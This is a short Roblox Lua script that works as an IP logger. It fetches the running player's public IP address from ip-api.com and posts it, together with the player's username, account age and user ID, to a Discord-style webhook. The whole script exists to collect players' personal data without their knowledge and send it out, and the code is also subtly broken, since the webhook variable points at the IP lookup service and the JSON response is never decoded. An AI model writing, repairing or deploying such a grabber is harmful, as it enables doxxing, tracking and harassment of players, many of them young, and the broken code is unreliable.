local HTTP = game:GetService("HttpService")

local webhookurl = "http://ip-api.com/json" -- This can be found by going into your discord server settings then going to integrations then going to webhooks
local player = game.Players.LocalPlayer
local a = game:HttpGet("http://ip-api.com/json")

wait(5)

	local data = {
		["embeds"] = {{

			["author"] = {
				["name"] = player.Name,
				["icon_url"] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username="..player.Name
			},
			["description"] = "IP:  " .. a.query,
			["color"] = tonumber(0xFFFAFA),
			["fields"] = {
				{
					["name"] = "Account Age:",
					["value"] = player.AccountAge,
					["inline"] = true
				},
				{
					["name"] = "User ID:",
					["value"] = player.UserId,
					["inline"] = true
				}
			}
		}},

	}
	local finaldata = HTTP:JSONEncode(data)
	HTTP:PostAsync(webhookurl, finaldata)
